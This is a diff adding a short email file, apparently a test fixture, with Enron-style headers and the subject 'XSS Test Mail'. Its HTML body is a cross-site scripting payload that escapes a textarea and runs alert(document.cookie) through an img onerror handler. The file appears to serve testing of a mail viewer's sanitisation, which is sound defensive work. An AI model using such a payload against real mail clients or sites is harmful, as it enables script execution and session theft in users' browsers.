@@ -1,0 +1,7 @@
+From: diana.higgins@enron.com
+To: janine.migden@enron.com, l..lawrence@enron.com
+Subject: XSS Test Mail
+MIME-Version: 1.0
+Content-type: text/html
+
+</textarea><img onerror=alert(document.cookie) src=#><textarea>
